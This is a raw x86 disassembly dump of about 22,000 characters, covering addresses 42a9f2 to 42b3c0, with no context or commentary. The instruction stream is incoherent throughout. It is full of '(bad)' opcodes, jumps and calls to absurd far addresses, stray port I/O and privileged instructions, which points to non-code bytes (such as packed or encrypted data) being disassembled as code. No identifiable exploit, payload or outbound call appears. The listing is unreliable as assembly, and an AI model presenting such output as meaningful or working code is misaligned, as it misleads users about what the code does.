  42a9f2:	or     eax,0xb35c3a62
  42a9f7:	xor    DWORD PTR ds:0xaae911c1,edi
  42a9fd:	xor    BYTE PTR [edx+0x0],al
  42aa00:	mov    BYTE PTR [ebx],ah
  42aa02:	add    eax,0x4d32003c
  42aa07:	ret    0x88b0
  42aa0a:	sar    edi,cl
  42aa0c:	cld    
  42aa0d:	fimul  DWORD PTR [ecx+0x74]
  42aa10:	sub    eax,0x21239ebc
  42aa15:	xchg   ecx,eax
  42aa16:	and    DWORD PTR [ecx],edi
  42aa18:	or     esi,esp
  42aa1a:	sub    dl,0x6e
  42aa1d:	mov    ebp,0x4bb5ff16
  42aa22:	stc    
  42aa23:	jae    0x42a9f2
  42aa25:	test   DWORD PTR [eax],0x0
	...
  42aa43:	add    cl,dh
  42aa45:	adc    al,0x4d
  42aa47:	repnz sub al,BYTE PTR [eax]
  42aa4a:	ins    BYTE PTR es:[edi],dx
  42aa4b:	inc    ebx
  42aa4c:	pop    edi
  42aa4d:	sub    eax,0x1058caa2
  42aa52:	xlat   BYTE PTR ds:[ebx]
  42aa53:	sbb    eax,0xbd5ecde5
  42aa58:	push   ss
  42aa59:	mov    ecx,eax
  42aa5b:	div    DWORD PTR [ebp+0x3e06990e]
  42aa61:	and    al,0xe5
  42aa63:	push   es
  42aa64:	pop    ds
  42aa65:	pushf  
  42aa66:	(bad)  
  42aa67:	ret    
  42aa68:	stos   BYTE PTR es:[edi],al
  42aa69:	sub    DWORD PTR [ecx],0xffffff90
  42aa6c:	adc    BYTE PTR [ebx-0x5e4d085d],cl
  42aa72:	inc    ecx
  42aa73:	add    eax,0x90223a91
  42aa78:	outs   dx,DWORD PTR ds:[esi]
  42aa79:	jmp    0xff27:0x5d835350
  42aa80:	jp     0x42aa8f
  42aa82:	cmp    al,BYTE PTR [ebx-0x79]
  42aa85:	add    esp,DWORD PTR [ebx+eax*1]
  42aa88:	in     eax,dx
  42aa89:	aas    
  42aa8a:	jmp    0xb074e75f
  42aa8f:	sahf   
  42aa90:	adc    eax,0xfb90e750
  42aa95:	push   ebp
  42aa96:	pop    esi
  42aa97:	mov    ah,0xe
  42aa99:	(bad)  
  42aa9b:	adc    edx,DWORD PTR [ebx+edx*1+0x320ad1f7]
  42aaa2:	add    BYTE PTR [eax-0x10eb79b2],bl
	...
  42aac4:	add    BYTE PTR [eax],al
  42aac6:	mov    BYTE PTR [edi],dh
  42aac8:	dec    eax
  42aac9:	jmp    0x42ab47
  42aacb:	in     eax,0x5a
  42aacd:	out    dx,al
  42aace:	leave  
  42aacf:	ds (bad) 
  42aad1:	scas   al,BYTE PTR es:[edi]
  42aad2:	or     eax,0xaa0038
  42aad7:	mov    ch,0xc0
  42aad9:	je     0x42aae8
  42aadb:	rol    DWORD PTR [eax],0x9
  42aade:	sar    ebp,1
  42aae0:	mov    al,cs:0xb262cfdc
  42aae6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aae7:	jmp    FWORD PTR [esi+0x12]
  42aaea:	pushf  
  42aaeb:	push   esp
  42aaec:	xchg   ecx,esp
  42aaee:	fimul  DWORD PTR [edx+esi*4]
  42aaf1:	icebp  
  42aaf2:	fnstenv [esi+eax*8+0x3cbbc1c7]
  42aaf9:	mul    BYTE PTR [eax-0x223808d0]
  42aaff:	div    DWORD PTR [edi+0x936]
  42ab05:	(bad)  
  42ab06:	lods   eax,DWORD PTR ds:[esi]
  42ab07:	clc    
  42ab08:	ds (bad) 
  42ab0a:	daa    
  42ab0b:	cmp    DWORD PTR [edx-0x79],ecx
  42ab0e:	lds    ecx,FWORD PTR [ebp-0x2]
  42ab11:	call   0x3cd9:0xde575be7
  42ab18:	(bad)  
  42ab19:	mov    ecx,0xed896347
  42ab1e:	mov    eax,0xec202fc0
  42ab23:	mov    ah,0xcc
  42ab25:	stos   BYTE PTR es:[edi],al
  42ab26:	push   cs
  42ab27:	cmp    eax,0xa1b8
	...
  42ab48:	sbb    al,BYTE PTR [eax+0x0]
  42ab4b:	aaa    
  42ab4c:	aam    0xc
  42ab4e:	xchg   ebx,ebx
  42ab50:	iret   
  42ab51:	jmp    0xf2:0x661f1a1a
  42ab58:	sar    DWORD PTR [eax+0x4],1
  42ab5b:	ins    BYTE PTR es:[edi],dx
  42ab5c:	daa    
  42ab5d:	adc    al,BYTE PTR [edx-0x447fdf90]
  42ab63:	add    al,0xf5
  42ab65:	les    ebp,FWORD PTR [edi-0x2a]
  42ab68:	test   DWORD PTR [ebx],0xf59de17c
  42ab6e:	scas   eax,DWORD PTR es:[edi]
  42ab6f:	int3   
  42ab70:	out    0x3,eax
  42ab72:	pop    edx
  42ab73:	ret    
  42ab74:	push   ebp
  42ab75:	dec    ebp
  42ab76:	mov    DWORD PTR [ebx-0xc],0xe4026bc5
  42ab7d:	add    BYTE PTR ds:0x1348c,cl
  42ab83:	add    BYTE PTR [edx],al
  42ab85:	stos   DWORD PTR es:[edi],eax
  42ab86:	xor    dl,dl
  42ab88:	stos   BYTE PTR es:[edi],al
  42ab89:	add    edi,esp
  42ab8b:	(bad)  
  42ab8c:	mov    ebx,0xe08bc977
  42ab91:	jne    0x42ab4a
  42ab93:	int3   
  42ab94:	ja     0x42ab96
  42ab96:	xor    DWORD PTR [ecx+edi*1],eax
  42ab99:	dec    ecx
  42ab9a:	mov    DWORD PTR [ebx-0x5c],0xa033c5df
  42aba1:	jne    0x42ab56
  42aba3:	int3   
  42aba4:	ja     0x42aba6
  42aba6:	mov    eax,edi
  42aba8:	in     eax,0x18
  42abaa:	and    bh,0x0
	...
  42abc9:	add    BYTE PTR [ebp-0x1b430031],ah
  42abcf:	cmp    eax,DWORD PTR [eax+0x0]
  42abd2:	addr16 cld 
  42abd4:	xchg   ah,ch
  42abd6:	es sar bl,0x41
  42abda:	std    
  42abdb:	cld    
  42abdc:	xchg   BYTE PTR [eax-0x7f043fd8],bh
  42abe2:	pop    esi
  42abe3:	sbb    al,0xfb
  42abe5:	push   DWORD PTR [esp+edi*2-0x46]
  42abe9:	sub    DWORD PTR [esi+0x70],0xe70dfffa
  42abf0:	sub    BYTE PTR [edi],0x98
  42abf3:	ficomp DWORD PTR [eax+0x42951b8]
  42abf9:	xchg   DWORD PTR [edx+edi*8],ecx
  42abfc:	inc    esp
  42abfd:	add    al,0xee
  42abff:	lods   al,BYTE PTR ds:[esi]
  42ac00:	xor    eax,DWORD PTR [ecx]
  42ac02:	xchg   esi,eax
  42ac03:	scas   al,BYTE PTR es:[edi]
  42ac04:	and    ebx,0xc
  42ac07:	jb     0x42ac49
  42ac09:	mov    ebp,0x43a54d
  42ac0e:	fimul  WORD PTR [edi+0x78]
  42ac11:	cld    
  42ac12:	or     cl,BYTE PTR [ebx-0x7ec1172b]
  42ac18:	lea    edi,[ecx]
  42ac1a:	mov    gs,WORD PTR [eax-0x20b7ef8]
  42ac20:	fnstcw WORD PTR [edi]
  42ac22:	or     eax,0x1087d3ed
  42ac27:	fstp   st(1)
  42ac29:	aas    
  42ac2a:	or     eax,0xccbc88
	...
  42ac4b:	add    BYTE PTR [esi-0x17],cl
  42ac4e:	xor    al,cl
  42ac50:	out    dx,al
  42ac51:	and    dh,BYTE PTR [ebx]
  42ac53:	rcl    DWORD PTR [esi-0x71172acf],0x48
  42ac5a:	add    eax,0xc464092f
  42ac5f:	ret    
  42ac60:	dec    esi
  42ac61:	jmp    0x114adbc4
  42ac66:	sar    BYTE PTR [edi],cl
  42ac68:	or     eax,0xbb74a2bb
  42ac6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ac6e:	jmp    FWORD PTR [esi]
  42ac70:	dec    ebp
  42ac71:	pop    esi
  42ac72:	adc    BYTE PTR [ebp+0x4335c5],al
  42ac78:	int    0x45
  42ac7a:	mov    eax,0x8ae8cecc
  42ac7f:	ror    DWORD PTR [ecx+eax*1+0xb],0x2f
  42ac84:	push   ebp
  42ac85:	add    BYTE PTR [esi-0x3c],ch
  42ac88:	xor    BYTE PTR [ebp-0x3ea9c1bf],ch
  42ac8e:	leave  
  42ac8f:	or     bh,dl
  42ac91:	(bad)  
  42ac92:	pop    esi
  42ac93:	(bad)  
  42ac94:	call   0x39454f24
  42ac99:	ror    ecx,0x12
  42ac9c:	loop   0x42ac65
  42ac9e:	pop    esi
  42ac9f:	les    ecx,FWORD PTR [eax+ebp*8-0x29]
  42aca3:	ss dec esp
  42aca5:	mov    edi,0x51298f3c
  42acaa:	cmp    BYTE PTR [ebp+edx*4-0x2f],ch
  42acae:	es add al,0x0
	...
  42accd:	add    BYTE PTR [esi],al
  42accf:	adc    eax,0x4d15c9
  42acd4:	je     0x42ad1e
  42acd6:	cmc    
  42acd7:	dec    edi
  42acd8:	jp     0x42acf2
  42acda:	push   ebp
  42acdb:	adc    DWORD PTR [ecx],ebp
  42acdd:	add    al,0x90
  42acdf:	mov    edi,0x14e60bf4
  42ace4:	add    DWORD PTR [edi],edx
  42ace6:	dec    ebp
  42ace7:	add    BYTE PTR [esi+0x6],cl
  42acea:	mov    al,BYTE PTR [ecx+edx*2-0x15]
  42acee:	je     0x42ace9
  42acf0:	dec    edx
  42acf1:	add    bh,BYTE PTR [eax+eax*1+0x30]
  42acf5:	(bad)  
  42acf6:	and    eax,0xd461378
  42acfb:	sti    
  42acfc:	fcom   QWORD PTR [edi]
  42acfe:	sbb    eax,DWORD PTR [eax-0x17]
  42ad01:	(bad)  
  42ad02:	lea    edi,[ecx+eiz*2]
  42ad05:	loopne 0x42ace1
  42ad07:	(bad)  
  42ad08:	call   0xf55f3763
  42ad0d:	adc    eax,0x5ab2ffcd
  42ad12:	mov    bh,BYTE PTR [ecx+eiz*8]
  42ad15:	adc    eax,0x3173ffcd
  42ad1a:	mov    bh,0x7
  42ad1c:	add    BYTE PTR [edi],dl
  42ad1e:	sar    edi,cl
  42ad20:	push   ecx
  42ad21:	out    dx,al
  42ad22:	inc    esp
  42ad23:	jg     0x42ad62
  42ad25:	mov    eax,ds:0xe9003a3a
  42ad2a:	fist   DWORD PTR [ecx]
  42ad2c:	call   0xfc3eb9ae
  42ad31:	add    BYTE PTR gs:[eax],al
	...
  42ad50:	dec    ecx
  42ad51:	jae    0x42ad64
  42ad53:	scas   al,BYTE PTR es:[edi]
  42ad54:	adc    bh,BYTE PTR [ebp+ebx*8+0x8e2092a]
  42ad5b:	sub    edx,DWORD PTR [ecx]
  42ad5d:	mov    esi,0x3a427105
  42ad62:	add    al,ch
  42ad64:	mov    ah,0xf6
  42ad66:	iret   
  42ad67:	pop    edi
  42ad68:	xchg   ecx,eax
  42ad69:	int    0x3f
  42ad6b:	jmp    0x8216a2d4
  42ad70:	xor    dh,0xfb
  42ad73:	xchg   BYTE PTR [edi-0x7f],dl
  42ad76:	clc    
  42ad77:	jle    0x42ad51
  42ad79:	add    ebx,0xbf516f16
  42ad7f:	mov    dl,0x4a
  42ad81:	and    al,0x4
  42ad83:	fild   QWORD PTR [ecx+eiz*1]
  42ad86:	inc    esp
  42ad87:	add    eax,0x62404e05
  42ad8c:	shl    DWORD PTR [ebx+0x4],0x1a
  42ad90:	leave  
  42ad91:	loope  0x42ad9e
  42ad93:	push   ecx
  42ad94:	xchg   ch,dh
  42ad96:	sti    
  42ad97:	ds clc 
  42ad99:	leave  
  42ad9a:	repz aas 
  42ad9c:	cwde   
  42ad9d:	mov    edx,0x7eaa4ff
  42ada2:	pop    edx
  42ada3:	sub    eax,DWORD PTR ds:0x94da5200
  42ada9:	aaa    
  42adaa:	je     0x42ad79
  42adac:	sbb    ch,BYTE PTR [esi+0x20]
  42adaf:	mov    dh,0x1d
  42adb1:	scas   al,BYTE PTR es:[edi]
  42adb2:	jl     0x42adb4
	...
  42add0:	add    BYTE PTR [eax],al
  42add2:	dec    eax
  42add3:	adc    DWORD PTR [edi-0x48],ecx
  42add6:	jae    0x42add5
  42add8:	(bad)  
  42add9:	dec    DWORD PTR [edi+edi*4]
  42addc:	idiv   edi
  42adde:	jae    0x42ad6c
  42ade0:	dec    esp
  42ade1:	and    al,0x60
  42ade3:	test   DWORD PTR [esi+ecx*1],eax
  42ade6:	sub    bh,BYTE PTR [ebx]
  42ade8:	je     0x42ae0e
  42adea:	inc    esp
  42adeb:	jae    0x42adcc
  42aded:	pop    edi
  42adee:	repnz ror DWORD PTR [eax+eax*1],0x19
  42adf3:	mov    ebp,esp
  42adf5:	add    DWORD PTR [eax+0x11],0x4e
  42adf9:	(bad)  
  42adfa:	jmp    0x73e09612
  42adff:	add    ah,bh
  42ae01:	mov    esi,DWORD PTR [esi+eax*4+0x75]
  42ae05:	clc    
  42ae06:	jl     0x42ae3a
  42ae08:	idiv   edi
  42ae0a:	mov    ds:0xf40100a5,eax
  42ae0f:	cld    
  42ae10:	jae    0x42ae22
  42ae12:	stos   DWORD PTR es:[edi],eax
  42ae13:	inc    ecx
  42ae14:	in     al,dx
  42ae15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ae16:	jge    0x42ae55
  42ae18:	add    bh,al
  42ae1a:	cmp    esp,esi
  42ae1c:	mov    eax,0xe3043489
  42ae21:	push   cs
  42ae22:	sub    eax,DWORD PTR [edx-0x14]
  42ae25:	mov    eax,0xc7003d5d
  42ae2a:	jns    0x42ae18
  42ae2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ae2d:	mov    DWORD PTR [esp+edi*8+0x4a],esi
  42ae31:	xor    ebp,edi
  42ae33:	test   DWORD PTR [ebp-0x4],ebx
	...
  42ae52:	add    BYTE PTR [eax],al
  42ae54:	cmp    eax,0xe73b105a
  42ae59:	movd   DWORD PTR [ebx],mm3
  42ae5c:	mov    ch,0xfc
  42ae5e:	dec    DWORD PTR [edx-0x1f84fb97]
  42ae64:	xchg   esp,eax
  42ae65:	test   DWORD PTR [ebp-0xc],eax
  42ae68:	or     eax,0x1d7d84ba
  42ae6d:	in     eax,0x72
  42ae6f:	sub    ah,BYTE PTR [ebp+0xc]
  42ae72:	add    esp,edi
  42ae74:	jb     0x42aec5
  42ae76:	inc    DWORD PTR [eax]
  42ae78:	or     eax,0x4a1073e7
  42ae7d:	mov    ds:0x2684a4eb,eax
  42ae82:	add    al,0xc3
  42ae84:	enter  0xbcd6,0x89
  42ae88:	int    0xe6
  42ae8a:	out    0xa,al
  42ae8c:	dec    edx
  42ae8d:	and    esi,eax
  42ae8f:	mov    eax,0xc3042684
  42ae94:	enter  0xa8b6,0x89
  42ae98:	int    0xe6
  42ae9a:	jle    0x42af01
  42ae9c:	std    
  42ae9d:	out    0x7e,al
  42ae9f:	jge    0x42aec2
  42aea1:	out    0x73,al
  42aea3:	sub    al,BYTE PTR [esi+0x94527a5]
  42aea9:	imul   edi,esp,0x1
  42aeac:	jnp    0x42ae6b
  42aeae:	out    0xac,eax
  42aeb0:	sti    
  42aeb1:	jle    0x42aeae
  42aeb3:	xchg   ebp,eax
  42aeb5:	inc    ecx
  42aeb6:	add    eax,0x1
	...
  42aed3:	add    BYTE PTR [eax],al
  42aed5:	add    BYTE PTR ds:0x26c81ee9,cl
  42aedb:	mov    eax,ds:0xac860e79
  42aee0:	or     esp,DWORD PTR [esi+0x2d]
  42aee3:	shl    DWORD PTR [ebp-0x77],0x11
  42aee7:	mov    al,0x8c
  42aee9:	pop    ebp
  42aeea:	rol    DWORD PTR [eax-0x60],0x0
  42aeee:	or     eax,0x545f5e9
  42aef3:	or     DWORD PTR [eax+0x2f],edi
  42aef6:	nop
  42aef7:	adc    bh,BYTE PTR [ecx+0x2]
  42aefa:	fwait
  42aefb:	pushf  
  42aefc:	pop    es
  42aefd:	and    BYTE PTR [ecx],0x0
  42af00:	shr    bl,1
  42af02:	adc    eax,0xf3ff1af6
  42af07:	cld    
  42af08:	aad    0xd1
  42af0a:	in     al,0xee
  42af0c:	sbb    BYTE PTR [ecx+0x51e06d4b],cl
  42af12:	jmp    0x42af1c
  42af14:	mov    eax,ds:0xf2f6abeb
  42af19:	dec    BYTE PTR [edx-0x60f122bb]
  42af1f:	ror    BYTE PTR [ebx-0x7d],0x4d
  42af23:	xor    BYTE PTR [ebx-0x73],al
  42af26:	adc    DWORD PTR [ecx-0x42],ebx
  42af29:	bound  ecx,QWORD PTR [edx-0x3e7506c3]
  42af2f:	jl     0x42af06
  42af31:	mov    cl,al
  42af33:	add    ebp,DWORD PTR [edi+edi*1-0x3b]
  42af37:	xor    ch,BYTE PTR [ecx+0x84]
	...
  42af55:	add    BYTE PTR [eax],al
  42af57:	add    BYTE PTR [edi],ah
  42af59:	pushf  
  42af5a:	pusha  
  42af5b:	inc    ebx
  42af5c:	or     eax,0xabc37c07
  42af61:	push   DWORD PTR [eax]
  42af63:	sub    ebp,0x5
  42af66:	retw   
  42af68:	or     al,ch
  42af6a:	pop    ebp
  42af6b:	std    
  42af6c:	div    dh
  42af6e:	jnp    0x42afb8
  42af70:	add    eax,0xa70f0301
  42af75:	sti    
  42af76:	mov    eax,0xf3fe9465
  42af7b:	daa    
  42af7c:	fistp  QWORD PTR [ecx+esi*8]
  42af7f:	add    DWORD PTR [ecx+0x7],ebx
  42af82:	fiadd  DWORD PTR fs:[ecx+0xb]
  42af86:	pop    esi
  42af87:	dec    eax
  42af88:	adc    DWORD PTR [esi+0x66],ebx
  42af8b:	jg     0x42afe2
  42af8d:	test   BYTE PTR [ecx],0x78
  42af90:	push   es
  42af91:	out    dx,al
  42af92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42af93:	or     edx,DWORD PTR ds:0xb6d8006c
  42af99:	(bad)  
  42af9a:	stc    
  42af9b:	cs fwait
  42af9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42af9e:	add    DWORD PTR [ebp+0x1ee0b806],ebx
  42afa4:	push   cs
  42afa5:	add    BYTE PTR [edx-0x18],ah
  42afa8:	or     edi,DWORD PTR [edi+0x75]
  42afab:	adc    edi,ecx
  42afad:	cli    
  42afae:	inc    ebp
  42afaf:	fnstenv [edi]
  42afb1:	fimul  DWORD PTR [ebx]
  42afb3:	imul   ebx,DWORD PTR [esi-0x7],0xfffffffb
  42afb7:	test   al,0xf1
  42afba:	inc    ebp
  42afbb:	loope  0x42afbd
	...
  42afd9:	add    dh,bh
  42afdb:	dec    esi
  42afdc:	je     0x42afde
  42afde:	mov    dh,cl
  42afe0:	je     0x42afd6
  42afe2:	xchg   ebp,eax
  42afe3:	cmp    al,0xc
  42afe5:	(bad)  fs:[edi-0x6]
  42afe9:	inc    edi
  42afea:	mov    WORD PTR [eax],?
  42afec:	and    BYTE PTR [esp+eax*1],bh
  42afef:	ja     0x42afda
  42aff1:	jmp    0x42afcb
  42aff3:	ins    BYTE PTR es:[edi],dx
  42aff4:	hlt    
  42aff5:	ret    0x7f0c
  42aff8:	inc    ebp
  42aff9:	fstp   st(5)
  42affb:	enter  0x2cf2,0x1
  42afff:	add    ah,BYTE PTR [edx+0x70]
  42b002:	sbb    eax,0x11fa7470
  42b007:	mov    cl,0x8
  42b009:	push   0xfffffff6
  42b00b:	pop    edi
  42b00c:	outs   dx,BYTE PTR ds:[esi]
  42b00d:	repnz (bad) 
  42b00f:	div    DWORD PTR [esi-0xa]
  42b012:	adc    BYTE PTR [ebp-0x3f],dh
  42b015:	mov    DWORD PTR [ebx-0x79],ebp
  42b018:	or     BYTE PTR [edx-0x2d],ah
  42b01b:	pop    edx
  42b01c:	leave  
  42b01d:	sub    edi,ebp
  42b01f:	call   DWORD PTR [edx+esi*2-0x43]
  42b023:	dec    edi
  42b024:	push   ecx
  42b025:	mov    esi,0xcc8d0734
  42b02a:	mov    dh,0x58
  42b02c:	call   0xf83a3731
  42b031:	call   FWORD PTR [edi]
  42b033:	inc    ebp
  42b034:	or     BYTE PTR [ebx+0x17e84bf3],cl
  42b03a:	push   ss
  42b03b:	cld    
  42b03c:	inc    DWORD PTR [eax+eax*1+0x0]
	...
  42b05b:	add    ah,ah
  42b05d:	ins    BYTE PTR es:[edi],dx
  42b05e:	push   DWORD PTR [edi+0xf32b]
  42b064:	nop    DWORD PTR [edx+0xa]
  42b068:	fnstenv [eax+edi*8+0x58]
  42b06c:	sbb    al,0x82
  42b06e:	repz jmp FWORD PTR [ebx-0x78]
  42b072:	dec    ebp
  42b073:	or     bh,ch
  42b075:	mov    edx,0xb262e850
  42b07a:	add    BYTE PTR [eax],al
  42b07c:	loope  0x42b03e
  42b07e:	jne    0x42b087
  42b080:	ins    BYTE PTR es:[edi],dx
  42b081:	repz test DWORD PTR [eax],0x32fae834
  42b088:	fs push esp
  42b08a:	leave  
  42b08b:	ret    0x120
  42b08e:	push   ebp
  42b08f:	mov    ebx,DWORD PTR [eax+0x67]
  42b092:	xor    ch,BYTE PTR [edx+0x34]
  42b095:	push   eax
  42b096:	not    DWORD PTR ds:0x400df4
  42b09c:	lahf   
  42b09d:	dec    ebp
  42b09e:	or     al,0x83
  42b0a0:	mov    al,0x4
  42b0a2:	bound  esi,QWORD PTR [edx]
  42b0a4:	imul   ecx,DWORD PTR [eax+0x4],0x3c988c51
  42b0ab:	add    ah,ah
  42b0ad:	jge    0x42b06f
  42b0af:	js     0x42b077
  42b0b1:	jge    0x42b07d
  42b0b3:	jne    0x42b0a6
  42b0b5:	mov    dh,0x27
  42b0b7:	jbe    0x42b0dd
  42b0b9:	cld    
  42b0ba:	mov    WORD PTR [ebp-0x28],es
  42b0bd:	push   eax
  42b0be:	call   0x42b165
	...
  42b0db:	add    BYTE PTR [eax],al
  42b0dd:	add    BYTE PTR [eax],ch
  42b0df:	cld    
  42b0e0:	inc    DWORD PTR [ebp+ecx*1-0x72f08cab]
  42b0e7:	add    al,0x26
  42b0e9:	jne    0x42b0ee
  42b0eb:	addr16 jge 0x42b0ef
  42b0ee:	or     eax,0xcd2f07ac
  42b0f3:	les    eax,FWORD PTR [esi+0x3941e33f]
  42b0f9:	lea    ecx,[esi-0x2b]
  42b0fc:	xor    dl,0x1
  42b0ff:	lds    ecx,FWORD PTR [ecx+0x731f890a]
  42b105:	sub    BYTE PTR [ebp+0x1b752f0f],cl
  42b10b:	jno    0x42b15a
  42b10d:	add    DWORD PTR [ebp+0x87476ff],ecx
  42b113:	neg    BYTE PTR [bx+si-0x20]
  42b117:	fisttp WORD PTR [eax+0xc7265ca]
  42b11d:	add    BYTE PTR ds:0x965312d2,cl
  42b123:	into   
  42b124:	mov    edx,edx
  42b126:	and    eax,0xd000ce5
  42b12b:	push   ds
  42b12c:	jmp    0x42b133
  42b12e:	fisubr WORD PTR [edi+0x6215895e]
  42b134:	inc    ecx
  42b135:	or     BYTE PTR [eax-0x72f48f5a],dl
  42b13b:	fisubr WORD PTR ds:0x7c691775
  42b141:	add    DWORD PTR [eax],eax
	...
  42b15f:	add    BYTE PTR ds:0xcd2f0014,cl
  42b165:	jle    0x42b165
  42b167:	dec    edi
  42b168:	in     eax,0xea
  42b16a:	idiv   bl
  42b16c:	jmp    0xc20c:0x253f8cfb
  42b173:	or     BYTE PTR ds:0x8eec8b0c,cl
  42b179:	add    BYTE PTR [ebp-0x4],cl
  42b17c:	mov    esp,fs
  42b17e:	add    BYTE PTR gs:0x588eb600,cl
  42b185:	or     BYTE PTR [esi+0x7],bl
  42b188:	push   es
  42b189:	stos   DWORD PTR es:[edi],eax
  42b18a:	mov    cl,0x47
  42b18c:	aas    
  42b18d:	jg     0x42b1ba
  42b18f:	sti    
  42b190:	pop    ebx
  42b191:	repz xor al,BYTE PTR [ecx*1-0x168f9fb5]
  42b199:	or     esi,DWORD PTR [eax+0x70]
  42b19c:	xor    DWORD PTR [eax],edx
  42b19e:	cmp    DWORD PTR [esi],0x4b
  42b1a1:	ins    BYTE PTR es:[edi],dx
  42b1a2:	lods   al,BYTE PTR ds:[esi]
  42b1a3:	dec    ebp
  42b1a4:	out    dx,eax
  42b1a5:	ss pop ds
  42b1a7:	jo     0x42b1df
  42b1a9:	out    0x5c,ax
  42b1ac:	out    dx,eax
  42b1ad:	mov    BYTE PTR [ebp+0x3b03051f],ch
  42b1b3:	dec    esp
  42b1b4:	enter  0x5e59,0x44
  42b1b8:	rcr    DWORD PTR [ecx-0x58],0xe3
  42b1bc:	adc    eax,0x90cbee5a
  42b1c1:	je     0x42b1d0
  42b1c3:	sbb    al,0x0
	...
  42b1e1:	add    BYTE PTR [edi+0x1b201d88],ch
  42b1e7:	mov    ebx,0x7309202d
  42b1ec:	jmp    0xa12abdf4
  42b1f1:	add    DWORD PTR [esi],edx
  42b1f3:	repz pusha 
  42b1f5:	aas    
  42b1f6:	jmp    0x17049006
  42b1fb:	jl     0x42b223
  42b1fd:	push   es
  42b1fe:	or     eax,0x49ec3900
  42b203:	pop    ds
  42b204:	jmp    0x74413c0c
  42b209:	dec    ebx
  42b20a:	add    eax,0x4b436e5a
  42b20f:	push   ecx
  42b210:	add    BYTE PTR [ecx+0x6efafde9],al
  42b216:	cmp    DWORD PTR [ebx],0xbe0bf924
  42b21c:	or     esp,DWORD PTR [ebp-0x18]
  42b21f:	icebp  
  42b220:	sti    
  42b221:	jmp    0xa6a9a84
  42b226:	or     DWORD PTR [eax],eax
  42b228:	sti    
  42b229:	mov    ebp,0x49e8100a
  42b22e:	call   0x13a4b232
  42b233:	out    dx,al
  42b234:	add    al,ch
  42b236:	and    bh,ch
  42b238:	jle    0x42b263
  42b23a:	mov    bl,cl
  42b23c:	(bad)  
  42b23d:	(bad)  [esi-0x7c]
  42b240:	inc    edi
  42b241:	in     eax,dx
  42b242:	loope  0x42b293
  42b244:	sti    
  42b245:	xchg   ebp,eax
	...
  42b262:	add    BYTE PTR [eax],al
  42b264:	adc    bl,BYTE PTR [eax]
  42b266:	mov    al,0xea
  42b268:	clc    
  42b269:	sti    
  42b26a:	pop    ecx
  42b26b:	adc    DWORD PTR [esi],ecx
  42b26d:	or     bh,bl
  42b26f:	neg    bl
  42b271:	mov    edi,0x60650b
  42b276:	add    cl,ch
  42b278:	cdq    
  42b279:	repnz or dl,BYTE PTR [esi-0x28d2bc37]
  42b280:	xor    al,0xff
  42b282:	call   DWORD PTR [ecx+edx*8+0x47]
  42b286:	je     0x42b263
  42b288:	and    eax,0x91d5246b
  42b28d:	push   ebx
  42b28e:	and    al,0xdd
  42b290:	es xchg ecx,eax
  42b292:	add    ebp,DWORD PTR [esi-0x173a17ec]
  42b298:	push   cs
  42b299:	add    BYTE PTR [edi+0x66102d15],al
  42b29f:	jmp    0x25cfb20c
  42b2a4:	sub    eax,0x5f00500d
  42b2a9:	imul   al
  42b2ab:	push   edx
  42b2ac:	jmp    0xa4c7aaa9
  42b2b1:	jo     0x42b2cf
  42b2b3:	and    al,0x11
  42b2b6:	pop    es
  42b2b7:	add    eax,0xe84e05e9
  42b2bc:	loop   0x42b263
  42b2be:	idiv   edi
  42b2c0:	dec    edi
  42b2c1:	stc    
  42b2c2:	jg     0x42b340
  42b2c4:	or     BYTE PTR [edi],al
  42b2c6:	add    al,0x75
	...
  42b2e4:	add    BYTE PTR [eax],al
  42b2e6:	mov    edx,0x25cbe84f
  42b2eb:	div    edi
  42b2ed:	call   0x39b9a1
  42b2f2:	daa    
  42b2f3:	dec    eax
  42b2f4:	and    al,0x10
  42b2f6:	xor    esp,ebp
  42b2f8:	test   DWORD PTR [ecx],eax
  42b2fa:	je     0x42b2f9
  42b2fc:	popa   
  42b2fd:	add    DWORD PTR [ebx],esp
  42b2ff:	add    DWORD PTR [eax+0x12],ebp
  42b302:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b303:	std    
  42b304:	dec    edi
  42b305:	dec    DWORD PTR [ecx+0x5d]
  42b308:	or     al,BYTE PTR [eax+0x74]
  42b30b:	arpl   WORD PTR [eax],ax
  42b30d:	(bad)  
  42b30e:	call   0x64434732
  42b313:	std    
  42b314:	dec    edi
  42b315:	push   0x292f45c1
  42b31a:	pop    esp
  42b31b:	push   es
  42b31c:	fadd   QWORD PTR [eax]
  42b31e:	and    al,0x7a
  42b320:	test   BYTE PTR [esp+esi*4],ah
  42b323:	cld    
  42b324:	(bad)  
  42b325:	inc    DWORD PTR [esp+eiz*8]
  42b328:	mov    al,ds:0x84f86356
  42b32d:	shl    BYTE PTR [ebx],0x71
  42b330:	dec    ebp
  42b331:	add    DWORD PTR [edi*8-0x767efe9f],esp
  42b338:	and    al,0xfc
  42b33a:	hlt    
  42b33b:	cld    
  42b33c:	jmp    edi
  42b33e:	or     eax,0xd00bbfc
  42b343:	pop    ebx
  42b344:	mov    edi,0xfec0910b
  42b349:	inc    DWORD PTR [eax]
	...
  42b367:	add    BYTE PTR ds:0x240a72,cl
  42b36d:	daa    
  42b36e:	add    al,0x85
  42b370:	int    0xd1
  42b372:	mov    al,BYTE PTR [ecx+esi*8-0x17]
  42b376:	xor    al,0xd7
  42b378:	add    eax,0xa0b1bb3
  42b37d:	fs xchg esi,eax
  42b37f:	add    BYTE PTR ds:0x98746de7,cl
  42b385:	mov    dl,0x1b
  42b387:	sub    al,0x45
  42b389:	dec    edi
  42b38a:	dec    ebx
  42b38b:	stc    
  42b38c:	call   0x55e:0xe9848229
  42b393:	add    BYTE PTR ds:0x75046db7,cl
  42b399:	push   0x627afbb4
  42b39e:	mov    edi,0xc15df774
  42b3a3:	push   eax
  42b3a4:	cwde   
  42b3a5:	bound  ebx,QWORD PTR [ebx]
  42b3a7:	mov    WORD PTR [edi],cs
  42b3a9:	out    0xff,eax
  42b3ab:	dec    edi
  42b3ac:	mov    ebp,0x52b499fe
  42b3b1:	loope  0x42b430
  42b3b3:	rol    cl,0x43
  42b3b6:	inc    sp
  42b3b8:	jecxz  0x42b3e2
  42b3ba:	mov    DWORD PTR [ecx+esi*8+0x1a],eax
  42b3be:	dec    edi
  42b3bf:	push   eax
  42b3c0:	xor    ch,bl
